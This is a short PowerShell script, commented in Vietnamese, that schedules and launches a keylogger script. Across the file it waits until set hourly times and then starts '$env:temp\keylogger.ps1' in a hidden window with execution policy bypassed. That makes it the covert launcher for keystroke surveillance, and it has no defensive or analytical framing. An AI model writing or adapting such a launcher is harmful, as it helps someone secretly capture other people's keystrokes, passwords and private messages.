$logTimes = @(
    '00:00:00',
    '01:00:00',
    '02:00:00',
    '03:00:00',
    '04:00:00',
    '05:00:00',
    '06:00:00',
    '07:00:00',
    '08:00:00',
    '09:00:00',
    '10:00:00',
    '11:00:00',
    '12:00:00'
)

# Sắp xếp thời gian
$logTimes = $logTimes | Sort-Object

# Đường dẫn đến keylogger.ps1
$keyloggerPath = "$env:temp\keylogger.ps1"

# Vòng lặp vô hạn để kiểm tra thời gian
while ($true) {
    foreach ($t in $logTimes) {
        # Lấy thời gian hiện tại
        $currentTime = Get-Date

        # Chuyển đổi thời gian trong $logTimes thành kiểu DateTime
        $scheduledTime = Get-Date -Date $t

        # Nếu thời gian hiện tại nhỏ hơn thời gian đã lên lịch
        if ($currentTime -lt $scheduledTime) {
            # Tính toán thời gian chờ
            $sleepDuration = $scheduledTime - $currentTime

            # Hiển thị thông báo chờ


            # Chờ đến thời gian đã lên lịch
            Start-Sleep -Seconds $sleepDuration.TotalSeconds
        }

        # Chạy keylogger.ps1
        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$keyloggerPath`"" -WindowStyle Hidden
    }

    # Thoát khỏi vòng lặp sau khi hoàn thành một chu kỳ
    break
}